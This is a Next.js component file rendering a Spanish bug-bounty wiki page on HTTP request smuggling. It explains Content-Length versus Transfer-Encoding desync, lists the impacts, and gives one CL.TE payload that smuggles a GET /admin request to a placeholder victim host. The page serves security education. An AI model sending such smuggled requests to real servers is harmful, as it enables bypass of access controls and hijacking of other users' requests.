/**
 * HTTP REQUEST SMUGGLING
 * Explotar diferencias en parseo HTTP
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  CodeBlock,
  ListItem
} from '@/components/WikiArticleComponents';
import { ArrowRight } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function HTTPRequestSmugglingContent({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      <Section id="introduccion" title="HTTP Request Smuggling - Desincronizar Servidores">
        <Paragraph>
          <Strong>HTTP Request Smuggling</Strong> explota diferencias en cómo el front-end y back-end 
          parsean Content-Length vs Transfer-Encoding para inyectar requests maliciosos.
        </Paragraph>

        <AlertDanger title="Impacto">
          <ul className="mt-2 space-y-1">
            <ListItem>🔓 Bypass de controles de seguridad</ListItem>
            <ListItem>🎯 Request hijacking (robo de credenciales)</ListItem>
            <ListItem>🕵️ Cache poisoning persistente</ListItem>
            <ListItem>⚡ XSS y SSRF amplificados</ListItem>
          </ul>
        </AlertDanger>
      </Section>

      <Section id="cl-te" title="1. CL.TE - Content-Length vs Transfer-Encoding">
        <CodeBlock
          language="http"
          title="Payload CL.TE"
          code={`POST / HTTP/1.1
Host: victim.com
Content-Length: 44
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: victim.com`}
        />
      </Section>

      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <Link
          href={`/${locale}/wiki/bug-bounty/cache-poisoning`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-orange-600 to-red-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-orange-500/50 transition-all"
        >
          <span>Cache Poisoning avanzado</span>
          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </Link>
      </div>
    </>
  );
}
